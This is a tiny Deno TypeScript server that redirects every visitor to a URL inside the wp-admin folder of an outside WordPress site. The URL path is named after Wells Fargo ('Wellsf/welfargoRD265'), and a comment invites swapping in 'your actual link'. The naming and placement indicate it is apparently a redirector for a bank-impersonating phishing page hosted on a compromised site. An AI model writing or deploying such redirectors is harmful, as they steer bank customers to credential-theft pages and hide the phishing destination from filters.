import { serve } from "https://deno.land/std/http/server.ts";

serve((_req) => {
  return new Response(null, {
    status: 302,
    headers: {
      Location: "https://waroeng88.org/wp-admin/Wellsf/welfargoRD265/", // Replace this with your actual link
    },
  });
});
